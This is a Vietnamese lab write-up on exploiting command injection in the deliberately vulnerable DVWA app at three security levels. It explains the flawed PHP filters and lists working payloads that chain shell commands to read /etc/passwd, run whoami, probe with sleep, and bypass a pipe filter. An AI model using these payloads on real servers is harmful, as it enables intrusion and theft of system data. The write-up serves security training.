# BÁO CÁO QUÁ TRÌNH KHAI THÁC COMMAND INJECTION (LOW, MEDIUM, HIGH)

---

## 1. COMMAND INJECTION (LOW)

Đầu tiên, giao diện là một trang yêu cầu người dùng nhập một địa chỉ IP để thực hiện lệnh *ping*:

<img width="1534" height="573" alt="image" src="https://github.com/user-attachments/assets/1557fdd8-c03f-4d45-b193-ebd4037e34f0" />

Thực hiện nhập một IP bất kỳ là 127.0.0.1 và tiến hành submit:

<img width="1534" height="595" alt="image" src="https://github.com/user-attachments/assets/8cb21e5d-9c16-405a-8404-5abe7925610e" />

Kiểm tra source PHP:
<img width="1530" height="650" alt="image" src="https://github.com/user-attachments/assets/cac5c127-93f4-4359-901d-c183077183be" />

&rarr; Ta có thể thấy nó nhận đầu vào là địa chỉ IP sau đó gán cho biến *target* và thực hiện lệnh ping đến IP đó thông qua hàm *shell_exec()*. Tuy nhiên Không có bất kỳ kiểm tra hoặc lọc dữ liệu đầu vào nào từ biến *target*, do đó người dùng có thể chèn thêm lệnh shell vào biến ip, lệnh đó sẽ thực thi trực tiếp trên server → lỗ hổng command injection.

Đầu tiên, ta có thể kiểm tra trang web đang tồn tại command injection bằng cách sử dụng *command substitution* như: *backsticks*, *dollar-parentheses*. Đây là kỹ thuật cho phép bạn chạy một lệnh bên trong một lệnh khác, và kết quả (output) của lệnh bên trong sẽ được thay thế như một chuỗi ở vị trí đó.

Ví dụ nhập *'sleep 5'* (backsticks) hoặc *$(sleep 5)* (dollar-parentheses), lúc này server sẽ thực thi câu lệnh: *ping 'sleep 5'* hoặc *ping $(sleep 5)*, tuy không phải là câu lệnh hợp lệ nhưng các lệnh *'sleep 5'* hay *$(sleep 5)* vẫn sẽ được thực thi. Do dó output có thể sleep tùy theo thời gian chỉ định để nhận biết tồn tại lỗ hổng.

Kết quả khi ta nhập *'sleep 5'* (backsticks), server vẫn thực thi và phản hồi trong 6s:

<img width="1544" height="597" alt="image" src="https://github.com/user-attachments/assets/b837ca65-5375-4436-9fee-1a041696615f" />

Tương tự nếu ta nhập *$(sleep 10)*, server vẫn thực thi và phản hồi trong 11s:

<img width="1533" height="554" alt="image" src="https://github.com/user-attachments/assets/ed4071fc-66da-47ae-8b98-0c7756cf25ff" />

&rarr; Kết luận tồn tại lỗ hổng Command Injection.

Ngoài ra cũng có thể chèn câu lệnh gửi request đến HTTP server: *http://127.0.0.1:1337* bằng *curl* hoặc *wget* vào trong backsticks để kiểm tra lỗ hổng như sau:

<img width="1530" height="634" alt="image" src="https://github.com/user-attachments/assets/5cf320e6-0d51-4c1c-8487-223d811be42f" />

Kết quả server thực hiện http server 1337 nhận được một request từ server trang web:

<img width="1531" height="440" alt="image" src="https://github.com/user-attachments/assets/7145da38-6d3c-4a18-a863-2f0663666eb4" />

Nhập payload: 

```bash
127.0.0.1; whoami; cat /etc/passwd
```

<img width="1536" height="609" alt="image" src="https://github.com/user-attachments/assets/2d161c62-0f02-41c8-95dd-c9054fc042ac" />

Nhập payload: 

```bash
127.0.0.1 && whoami && cat /etc/passwd
```

<img width="1533" height="640" alt="image" src="https://github.com/user-attachments/assets/f6a81eeb-9b15-41ff-ad65-222851201a4e" />

Nhập payload:

```bash
232.23.23.23 || cat /etc/passwd
```

<img width="1541" height="641" alt="image" src="https://github.com/user-attachments/assets/53d08ac9-0ce3-41b4-8d45-427d1bb1e75f" />

---

## 2. COMMAND INJECTION (MEDIUM)

Kiểm tra source PHP:

<img width="1542" height="698" alt="image" src="https://github.com/user-attachments/assets/49a9969a-6999-4608-bea5-7a834c4db948" />

&rarr; Có thể thấy hệ thống đã thực hiện thêm lọc bỏ hai ký tự đặc biệt là: && (để nối lệnh) và ; (dùng để kết thúc một câu lệnh và viết thêm lệnh mới). Tuy nhiên hệ thống không lọc các ký tự khác như: | (pipe), &, backsticks `command`, $(command), || (hoặc).

&rarr; Do đó vẫn tồn tại lỗ hổng Command injection.

Nhập payload: (Chạy lệnh trước ở mức nền, sau đó chạy tiếp lệnh whoami)

```bash
127.0.0.1 & whoami
```

<img width="1538" height="544" alt="image" src="https://github.com/user-attachments/assets/bfe85426-8b7d-40eb-955c-cf61b9611c4c" />

Nhập payload: (ping output sẽ được chuyển thành input cho whoami, và bạn sẽ thấy output từ whoami):

```bash
127.0.0.1 | whoami
```

<img width="1538" height="636" alt="image" src="https://github.com/user-attachments/assets/0baae3db-16c4-4144-9a8e-9be42539da10" />

Nhập payload: 

```bash
127.0.0.1 $(whoami)
```

<img width="1527" height="610" alt="image" src="https://github.com/user-attachments/assets/d10e4ffe-fa1e-495b-903b-5ae113134ab9" />

Nhập payload: 

```bash
127.0.0.1 `whoami`
```

<img width="1531" height="601" alt="image" src="https://github.com/user-attachments/assets/bf46835d-3313-4c5e-91ee-3619c4146d75" />

---

## 3. COMMAND INJECTION (HIGH)

Kiểm tra source PHP:

<img width="1429" height="605" alt="image" src="https://github.com/user-attachments/assets/861e3936-f4dc-495c-a6f5-1658e0a8351d" />

&rarr; Ta có thể thấy được rằng hệ thống đã thực hiện loại bỏ tất cả các ký tự có thể để thực hiện chèn thêm các câu lệnh để gửi lên cho server thực thi, cùng với đó là hàm *trim()* loại bỏ khoảng trắng dư thừa.

Tuy nhiên nếu để ý ta có thể phát hiện ra rằng ở ký tự | (pipe) có điểm đặc biệt, hệ thống chỉ dand thực hiện loại bỏ ký tự “| “ thành “” chứ không phải “|”.

Do đó ta có thể tận dụng điều này để tiến hành bypass filter ở mức high.

Ta có thể thực hiện nhập các payload biến thể của ký tự “|” như sau: *127.0.0.1|whoami* hoặc *127.0.0.1 |whoami*, vì hệ thống chỉ loại bỏ ký tự “| “.

Nếu nhập payload: 

```bash
127.0.0.1| whoami or 127.0.0.1 | whoami
```

<img width="1539" height="625" alt="image" src="https://github.com/user-attachments/assets/6e1363ee-82d5-4a53-ba4d-4737aa088454" />

&rarr; Không thành công.

Nhưng nhập payload:

```bash
127.0.0.1|cat /etc/passwd
```

<img width="1529" height="644" alt="image" src="https://github.com/user-attachments/assets/9be25641-c817-473e-92b5-6c6c124afdb5" />

Nhập payload: 

```bash
127.0.0.1|whoami
```

<img width="1535" height="626" alt="image" src="https://github.com/user-attachments/assets/edd1ccf9-bdad-4260-845e-3baf7d4aaee6" />

---

## ✅ Kết luận:

Thành công khai thác lỗ hổng Command Injection trên lab DVWA.

---

